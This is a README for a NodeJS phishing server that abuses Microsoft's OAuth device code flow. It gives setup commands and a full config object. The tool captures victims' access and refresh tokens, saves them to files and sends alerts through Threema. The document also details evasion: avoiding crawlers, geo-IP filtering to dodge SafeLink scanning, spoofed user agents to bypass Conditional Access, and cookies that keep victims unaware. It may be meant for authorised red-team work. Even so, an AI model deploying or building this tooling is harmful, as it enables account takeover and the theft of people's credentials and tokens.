# NodeJS App

## Description
This NodeJS app listens for users accessing the website. In the background a Device Code Flow is started and the User Code presented to the user. Once the user finished the flow, the tokens are stored to a file. This default example is configured to imitate a file sharing process.

## Requirements
Tested with NodeJS 18.13

## Installation
```
npm install
```

## Running
```
node server.js
```
## Certificates
Use certbot to get valid certificates for your phishing site
```
sudo certbot certonly --standalone
```
Configure the certificates/key in the configuration explaind below.

## Configuration
The `server.js` file contains a config objects:
```
const config = {
    httpPort: 80,
    httpsPort: 443,
    testMode: true,
    debug: false,
    clientId: 'd3590ed6-52b3-4102-aeff-aad2292ab01c', // This default ID is from MS Office
    tokenUrl: 'https://login.microsoftonline.com/Common/oauth2/v2.0/token',
    deviceCodeUrl: 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
    scopes: 'offline_access openid',
    phishingHTML: 'index.html',
    redirectUrl: 'https://www.microsoft.com',
    alreadyLoggedInURL: 'https://onedriveURLwithContentOrSomethingElse',
    cookieExpirationInDays: 90,
    userCodesFile: 'successful_user_code_cookies.txt',
    logFile: 'logfile.txt',
    tokenFile: 'tokens.txt',
    threemaOn: false,
    threemaTo: ['YourID1', 'YourID2'],
    threemaFrom: 'YourName',
    threemaURL: 'https://msgapi.threema.ch/send_simple',
    threemaSecret: 'PutYourSecretHere',
    keyFilePath: '/etc/letsencrypt/live/{path}/privkey.pem',
    certFilePath: '/etc/letsencrypt/live/{path}/cert.pem',
    caFilePath: '/etc/letsencrypt/live/{path}/fullchain.pem',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    geoipallowlist: ['CH']
}
```

Explanation of the variables:
- `httpPort`: Port used for HTTP connection. Should only be used in combination with `testMode`.
- `httpsPort`: Port used for HTTPS connection.
- `testMode`: When testing locally you usally have no SSL certificates, this mode makes that easier. When using `testMode` the server will listen on the `httpPort` instead `httpsPort` and TLS is not used. Can be `true` or `false`.
- `debug`: If verbose output should be logged to console and the logfile. Can be `true` or `false`.
- `clientId`: OAuth client ID of the application you are trying to get access to. This ID is very important since it impacts which access rights the requested will have. See https://github.com/secureworks/family-of-client-ids-research/blob/main/scope-map.txt for MS client IDs and what permissions your tokens get when using them. We use public MS client IDs since they do not need a client secret. Third-party applications would require admin approval to be used across tenants and thus is no options for this kind of phishing, since it would fail in most cases.
- `tokenUrl`: The URL where access tokens are requested. This is done by polling until the Device Code expires. This won't change often. The tenant, in default config `Common`, must match with the tenant used in `deviceCodeUrl` but could be changed to your victims tenant.
- `deviceCodeUrl`: The URL where a device code flow starts. Shouldn't change frequently. The tenant, in default config `Common`, must match with the tenant used in `tokenUrl` but could be changed to your victims tenant. This would show the vicitm the customer branded login page after entering the user code.
- `scopes`: Defines the capabilities of the resulting access token. Permissions are defined per client/app. (See also `clientID`). You need to include `offline_access` if you want a refresh token. Use a space to seperate different scopes. Use the scope `https://graph.microsoft.com/.default` for the default MS Graph scope.
- `phishingHTML`: HTML file that is presented to the victim user visiting the phishing website. You find this file in the folder `views`.
- `redirectUrl`: Where the victim is redirected if he accesses the base path / and not the path /share. Not using the base path is done so web crawlers won't start a Device Code Flow.
- `alreadyLoggedInURL`: Where should users be redirected to if they visit the phishing site again and have already completed the device code flow, which means we already have their token. This is done using cookies. This way the user won't notice something bad happened to him. You can prepare a OneDrive share or something else so the user has a success moment.
- `cookieExpirationInDays`: How long is the cookie valid that determines if we already have the tokens for a specific user.
- `userCodesFile`: Where are the codes of users stored we have successfully phished some tokens for.
- `logFile`: Where should the logfile be written to. This logfile contains the same output as on the console.
- `tokenFile`: Where should your polled access tokens be written to.
- `threemaOn`: If Threema notifications should be sent or not. Can be `true` or `false`.
- `threemaTo`: All the Threema IDs that should be notified when new access tokens were successfully pulled. IDs need to be in an array.
- `threemaFrom`: The Threema ID where the message is sent from.
- `threemaURL`: URL of the Threema API. Shouldn't change often.
- `threemaSecret`: Secret required to access the Threema API.
- `keyFilePath`: Path where the private key of your certificate used for HTTPS is stored.
- `certFilePath`: Path where the certificate used for HTTPS is stored.
- `caFilePath`: Path where the CA chain used for HTTPS is stored.
- `userAgenth`: User Agent which is used to fullfill requests. Can be used to bypass Conditional Access Policies if you know them of your customer.
- `geoipallowlist`: To (hopefully) stop SafeLink and other security products from scanning the page and potentially flag it as malicous, specific IP geolocations can be allowed, others are redirected to $redirectUrl.

Other things to mention:
- Static assets of the HTML you present to your victims have to be placed in the folder `public/assets`.
- User Codes are only valid for 15 minutes, afterwards they are no longer valid and polling stops
- The app will let you know each minute that polling is still happening or when the code expired